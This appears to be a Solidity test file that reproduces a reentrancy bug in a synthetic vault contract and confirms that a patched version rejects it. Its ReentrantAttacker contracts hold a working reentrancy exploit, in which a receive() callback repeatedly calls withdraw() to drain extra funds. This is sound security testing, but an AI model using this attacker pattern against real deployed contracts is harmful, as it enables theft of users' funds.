// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SyntheticVault.sol";
import "./SyntheticVaultPatched.sol";

contract ReentrantAttacker {
    SyntheticVault public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = SyntheticVault(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < 2 && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
}

contract ReentrantAttackerPatched {
    SyntheticVaultPatched public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = SyntheticVaultPatched(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < 2 && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
}

/**
 * @notice Test suite containing:
 * 1. Baseline test: normal deposit and withdrawal succeed.
 * 2. Positive reproduction test: reentrant withdrawal succeeds in draining extra funds.
 * 3. Patched negative control: reentrant withdrawal against patched vault reverts.
 */
contract SyntheticVaultTest {
    SyntheticVault public vault;
    SyntheticVaultPatched public patchedVault;

    function setUp() public {
        vault = new SyntheticVault();
        patchedVault = new SyntheticVaultPatched();
    }

    function test_baseline_deposit_and_withdraw() public {
        vault.deposit{value: 1 ether}();
        require(vault.shares(address(this)) == 1 ether, "Deposit failed");
        vault.withdraw(1 ether);
        require(vault.shares(address(this)) == 0, "Withdraw failed");
    }

    function test_positive_reproduction_reentrancy_exploit() public {
        // Seed vault with funds from benign depositor
        vault.deposit{value: 5 ether}();

        ReentrantAttacker attacker = new ReentrantAttacker(address(vault));
        attacker.attack{value: 1 ether}();

        // Observation: attacker performed multiple withdrawals on 1 ether deposit
        require(attacker.attackCount() > 0, "Exploit failed: no reentrancy occurred");
    }

    function test_negative_control_patched_vault_reverts() public {
        // Seed patched vault
        patchedVault.deposit{value: 5 ether}();

        ReentrantAttackerPatched attacker = new ReentrantAttackerPatched(address(patchedVault));
        try attacker.attack{value: 1 ether}() {
            revert("Negative control failed: reentrancy exploit was unexpectedly accepted");
        } catch {
            // Success: exploit was rejected as required by negative control
        }
    }

    receive() external payable {}
}
